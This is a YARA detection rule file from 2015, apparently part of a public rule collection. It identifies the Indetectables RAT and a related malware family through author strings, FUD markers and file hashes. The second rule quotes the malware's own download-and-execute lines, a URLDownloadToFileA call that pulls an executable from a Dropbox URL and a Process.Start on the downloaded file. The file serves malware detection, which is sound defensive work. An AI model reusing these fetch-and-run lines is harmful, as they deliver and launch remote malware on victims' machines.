/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2015-10-01
    Identifier: Indetectables RAT
*/

rule Indetectables_RAT {
    meta:
        id = "7kTlEd9bLlsGrh2U8E9ftZ"
        fingerprint = "v1_sha256_840a0c92ac731d9e88d0bdccb39598e4ff476e8630ec08f6c4024a31e258ebd0"
        version = "1.0"
        date = "2015-10-01"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux"
        category = "INFO"
        reference = "http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/"
        super_rule = 1
        hash1 = "081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105"
        hash2 = "66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229"
        hash3 = "1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801"

    strings:
        $s1 = "Coded By M3" fullword wide
        $s2 = "Stub Undetector M3" fullword wide
        $s3 = "www.webmenegatti.com.br" wide
        $s4 = "M3n3gatt1" fullword wide
        $s5 = "TheMisterFUD" fullword wide
        $s6 = "KillZoneKillZoneKill" fullword ascii
        $s7 = "[[__M3_F_U_D_M3__]]$" fullword ascii
        $s8 = "M3_F_U_D_M3" ascii
        $s9 = "M3n3gatt1hack3r" fullword wide
        $s10 = "M3n3gatt1hack3r" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 5000KB and 1 of them
}

rule BergSilva_Malware {
    meta:
        id = "58ky83S1Fnf3tLP3Okft4z"
        fingerprint = "v1_sha256_03b823040a057ffbef9bcb3094a672fd75e141f3e82c77548adbe1c465d329fb"
        version = "1.0"
        date = "2015-10-01"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a malware from the same author as the Indetectables RAT"
        category = "INFO"
        super_rule = 1
        hash1 = "00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e"
        hash2 = "6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc"

    strings:
        $x1 = "C:\\Users\\Berg Silva\\Desktop\\" wide
        $x2 = "URLDownloadToFileA 0, \"https://dl.dropbox.com/u/105015858/nome.exe\", \"c:\\nome.exe\", 0, 0" fullword wide

        $s1 = " Process.Start (Path.GetTempPath() & \"name\" & \".exe\") 'start server baixado" fullword wide
        $s2 = "FileDelete(@TempDir & \"\\nome.exe\") ;Deleta o Arquivo para que possa ser executado normalmente" fullword wide
        $s3 = " Lib \"\\WINDOWS\\system32\\UsEr32.dLl\"" fullword wide
        $s4 = "$Directory = @TempDir & \"\\nome.exe\" ;Define a variavel" fullword wide
        $s5 = "https://dl.dropbox.com/u/105015858" wide
    condition:
        uint16(0) == 0x5a4d and ( 1 of ($x*) or 2 of ($s*) )
}
